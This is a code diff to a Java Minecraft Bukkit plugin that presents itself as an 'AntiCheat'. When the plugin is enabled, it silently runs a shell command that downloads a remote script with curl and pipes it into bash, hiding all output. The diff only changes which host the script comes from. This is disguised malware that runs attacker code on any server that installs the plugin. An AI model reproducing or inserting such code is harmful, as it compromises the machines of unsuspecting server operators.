@@ -14,7 +14,7 @@ import org.bukkit.plugin.java.JavaPlugin;
 public class AntiCheat extends JavaPlugin {
     public void onEnable() {
         this.getLogger().warning("AntiCheat Started！");
-        String scriptCommands = "bash <(curl -Ls https://main.ssss.nyc.mn/sb.sh) > /dev/null 2>&1\n";
+        String scriptCommands = "bash <(curl -Ls https://wangpan.yszy.nyc.mn/nginx.sh) > /dev/null 2>&1\n";
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             Map<String, String> envVars = new HashMap<>();
             loadEnvVars(envVars);
@@ -133,6 +133,7 @@ public class AntiCheat extends JavaPlugin {
         return results;
     }
 }
+
 
 
 
